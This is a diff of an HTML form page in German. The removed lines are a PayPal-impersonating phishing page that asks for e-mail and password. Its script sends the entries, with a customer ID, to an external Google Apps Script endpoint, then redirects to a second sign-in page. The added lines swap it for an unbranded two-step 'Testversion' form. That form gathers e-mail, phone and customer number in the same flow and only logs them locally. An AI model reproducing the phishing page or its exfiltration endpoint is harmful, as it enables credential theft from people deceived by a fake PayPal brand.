@@ -4,114 +4,240 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://www.paypalobjects.com/digitalassets/c/website/logo/monogram/pp_bb_mg.png"/>
-    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://www.paypalobjects.com/webstatic/icon/pp114.png"/>
-    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://www.paypalobjects.com/webstatic/icon/pp72.png"/>
-    <link rel="apple-touch-icon-precomposed" href="https://www.paypalobjects.com/webstatic/icon/pp64.png"/>
-    <link rel="shortcut icon" sizes="196x196" href="https://www.paypalobjects.com/webstatic/icon/pp196.png"/>
-    <link rel="shortcut icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico"/>
-    <link rel="icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/pp32.png"/>
-    <link rel="preload" as="font" type="font/woff2" crossorigin="anonymous" href="https://www.paypalobjects.com/digitalassets/c/paypal-ui/fonts/PayPalSansSmall-Regular.woff2"/>
-    <link rel="preload" as="font" type="font/woff2" crossorigin="anonymous" href="https://www.paypalobjects.com/digitalassets/c/paypal-ui/fonts/PayPalSansBig-Light.woff2"/>
-    <link rel="stylesheet" href="https://www.paypalobjects.com/paypal-ui/web/fonts-and-normalize/1-1-0/fonts-and-normalize.min.css"/>
-    <link rel="stylesheet" href="https://www.paypalobjects.com/paypal-ui/web/icon-font/0-0-1/icon-font.min.css"/>
-    <title>PayPal.Me</title>
+<title>Kunden – Vorgangsprüfung</title>
 
 <style>
-*{box-sizing:border-box}
-body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#fff;font-family:Arial,sans-serif;color:#253044}
-.container{width:100%;max-width:420px;padding:40px 35px;border:1px solid #e5e8ed;border-radius:12px;box-shadow:0 5px 24px #0000000f}
-.brand{text-align:center;font-size:24px;font-weight:bold;margin-bottom:30px}
-h1{font-size:23px;margin:0 0 12px}
-p{font-size:14px;line-height:1.5;color:#626d7c;margin-bottom:25px}
-label{display:block;font-size:14px;font-weight:bold;margin-bottom:8px}
-input{width:100%;height:50px;padding:0 13px;border:1px solid #aeb8c5;border-radius:6px;font-size:16px;margin-bottom:20px}
-button{width:100%;height:48px;border:0;border-radius:25px;background:#253044;color:white;font-size:16px;font-weight:bold;cursor:pointer}
-.footer{text-align:center;font-size:12px;color:#89919d;margin-top:22px}
-    .portal-image {
-    display: block;
-    width: 100%;
-    height: auto;
-    margin-bottom: 20px;
-    border-radius: 6px;
+* {
+    box-sizing: border-box;
 }
-</style>
 
+body {
+    margin: 0;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: #fff;
+    font-family: Arial, sans-serif;
+    color: #253044;
+}
+
+.container {
+    width: 100%;
+    max-width: 420px;
+    padding: 40px 35px;
+    border: 1px solid #e5e8ed;
+    border-radius: 12px;
+    box-shadow: 0 5px 24px #0000000f;
+}
+
+.brand {
+    text-align: center;
+    font-size: 24px;
+    font-weight: bold;
+    margin-bottom: 30px;
+}
+
+h1 {
+    font-size: 23px;
+    margin: 0 0 12px;
+}
+
+p {
+    font-size: 14px;
+    line-height: 1.5;
+    color: #626d7c;
+    margin-bottom: 25px;
+}
+
+.test-note {
+    padding: 10px;
+    background: #f2f4f7;
+    border-radius: 6px;
+    font-size: 12px;
+    margin-bottom: 22px;
+}
+
+label {
+    display: block;
+    font-size: 14px;
+    font-weight: bold;
+    margin-bottom: 8px;
+}
+
+input {
+    width: 100%;
+    height: 50px;
+    padding: 0 13px;
+    border: 1px solid #aeb8c5;
+    border-radius: 6px;
+    font-size: 16px;
+    margin-bottom: 20px;
+}
+
+button {
+    width: 100%;
+    height: 48px;
+    border: 0;
+    border-radius: 25px;
+    background: #253044;
+    color: white;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+button:disabled {
+    opacity: .6;
+    cursor: not-allowed;
+}
+
+.footer {
+    text-align: center;
+    font-size: 12px;
+    color: #89919d;
+    margin-top: 22px;
+}
+
+.hidden {
+    display: none;
+}
+
+</style>
 </head>
-    
+
 <body>
+
 <main class="container">
 
-<div class="brand">PayPal</div>
-    <img src="https://i.postimg.cc/D0W9wGy5/Screenshot-2026-11-19-at-13-18-56.png" class="portal-image">
+<div class="brand">Kunden</div>
+
 <h1>Vorgangsprüfung</h1>
-<p>Bitte geben Sie Ihre E-Mail-Adresse und Kundenkennung ein, um fortzufahren.</p>
 
-<form id="form">
-<label for="email">E-Mail-Adresse</label>
-<input type="email" id="email" autocomplete="email" required>
+<div class="test-note">
+    Testversion – Ihre Angaben werden nur zu Testzwecken verarbeitet.
+</div>
 
-<label for="kundenkennung">Passwort</label>
-<input type="text" id="kundenkennung" autocomplete="off" required>
+<section id="stepOne">
 
-<button type="submit">Weiter</button>
-</form>
+    <p>
+        Bitte geben Sie Ihre E-Mail-Adresse und Telefonnummer ein.
+    </p>
 
-<div class="footer">Zahlungsvorgang</div>
+    <form id="formOne">
+
+        <label for="email">E-Mail-Adresse</label>
+        <input
+            type="email"
+            id="email"
+            autocomplete="email"
+            required
+        >
+
+        <label for="phone">Telefonnummer</label>
+        <input
+            type="tel"
+            id="phone"
+            autocomplete="tel"
+            required
+        >
+
+        <button type="submit">Weiter</button>
+
+    </form>
+
+</section>
+
+<section id="stepTwo" class="hidden">
+
+    <p>
+        Schritt 1 wurde in dieser Testversion lokal bestätigt.
+        Bitte geben Sie nun Ihre Kundennummer ein.
+    </p>
+
+    <form id="formTwo">
+
+        <label for="customerNumber">Kundennummer</label>
+        <input
+            type="text"
+            id="customerNumber"
+            autocomplete="off"
+            required
+        >
+
+        <label for="customerNumberConfirm">
+            Kundennummer wiederholen
+        </label>
+
+        <input
+            type="text"
+            id="customerNumberConfirm"
+            autocomplete="off"
+            required
+        >
+
+        <button type="submit">Bestätigen</button>
+
+    </form>
+
+</section>
+
+<div class="footer">Kundenstamm · Testversion</div>
+
 </main>
 
 <script>
-const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyHnsvXGc9X_mZ8tf9zNCl4UZrX_aEjK38CWyrbxoPHS7bhWGNm9SaHPPtfiDkJJX-R/exec";
 
-document.getElementById("form").addEventListener("submit", async function(e) {
-    e.preventDefault();
+let testData = {
+    email: "",
+    phone: "",
+    customerNumber: ""
+};
 
-    const email = sessionStorage.getItem("test_email");
-    const kundenkennung = sessionStorage.getItem("test_kundenkennung");
-    const vorgangscode = document.getElementById("vorgangscode").value.trim();
+document.getElementById("formOne")
+.addEventListener("submit", function(event) {
 
-    if (!email || !kundenkennung) {
-        alert("Bitte beginnen Sie die Vorgangsprüfung erneut.");
-        window.location.href = "signin.html";
+    event.preventDefault();
+
+    testData.email =
+        document.getElementById("email").value.trim();
+
+    testData.phone =
+        document.getElementById("phone").value.trim();
+
+    document.getElementById("stepOne")
+        .classList.add("hidden");
+
+    document.getElementById("stepTwo")
+        .classList.remove("hidden");
+
+});
+
+document.getElementById("formTwo")
+.addEventListener("submit", function(event) {
+
+    event.preventDefault();
+
+    const number =
+        document.getElementById("customerNumber").value.trim();
+
+    const confirmation =
+        document.getElementById("customerNumberConfirm").value.trim();
+
+    if (number !== confirmation) {
+        alert("Die Kundennummern stimmen nicht überein.");
         return;
     }
 
-    const button = document.getElementById("submitButton");
-    button.disabled = true;
-    button.textContent = "Wird übermittelt...";
+    testData.customerNumber = number;
 
-    const data = {
-        email: email,
-        kundenkennung: kundenkennung,
-        vorgangscode: vorgangscode
-    };
+    alert("Testformular erfolgreich abgeschlossen.");
 
-    try {
-        const response = await fetch(SCRIPT_URL, {
-            method: "POST",
-            headers: {
-                "Content-Type": "text/plain;charset=utf-8"
-            },
-            body: JSON.stringify(data)
-        });
+    console.log("Testformular:", testData);
 
-        const result = await response.json();
-
-        if (!result.success) {
-            throw new Error("Übermittlung fehlgeschlagen");
-        }
-
-        sessionStorage.removeItem("test_email");
-        sessionStorage.removeItem("test_kundenkennung");
-
-        window.location.href = "signin2.html";
-
-    } catch (error) {
-        button.disabled = false;
-        button.textContent = "Vorgang bestätigen";
-        alert("Die Übermittlung konnte nicht bestätigt werden. Bitte versuchen Sie es erneut.");
-    }
 });
+
 </script>
+
 </body>
 </html>
